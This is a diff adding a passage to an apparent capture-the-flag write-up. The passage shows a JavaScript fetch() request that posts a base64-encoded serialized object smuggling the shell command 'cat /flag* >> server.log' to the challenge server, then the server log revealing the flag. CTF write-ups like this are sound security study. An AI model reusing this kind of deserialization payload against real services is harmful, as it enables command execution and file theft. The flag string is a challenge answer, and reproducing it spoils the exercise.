@@ -16,3 +16,22 @@ Exploit was executed successfully
 ```
 
 For the given example exploit, the flag will be saved on the server.log file.
+
+The payload can be send using (it will return an error):
+```javascript
+fetch("/", {
+  "headers": {
+    "content-type": "text/plain;charset=UTF-8"
+  },
+  "body": btoa('a:1:{C:7:"Command":49:{{"p":{"cmd":"cat /flag* >> server.log"},"s":null}};N;}'),
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "omit"
+});
+```
+
+But if we run the server log command, the flag will be returned inside the `server.log`:
+```
+[2025-07-06T06:18:53.311Z] Server listening on http://localhost:1337
+ECSC{n0w_I_r3AlLy_gOt_mA_F1Rt_z3r0-d4y!}
+```
